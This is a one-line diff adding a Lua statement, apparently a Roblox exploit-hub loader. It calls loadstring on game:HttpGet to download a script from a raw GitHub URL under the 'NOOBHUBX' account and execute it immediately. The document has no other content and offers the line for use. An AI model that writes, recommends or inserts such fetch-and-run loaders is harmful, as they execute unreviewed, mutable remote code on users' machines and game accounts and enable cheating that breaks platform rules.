@@ -1,0 +1,1 @@
+loadstring(game:HttpGet(('https://raw.githubusercontent.com/NOOBHUBX/NOOBHUB/refs/heads/main/Game'),true))()
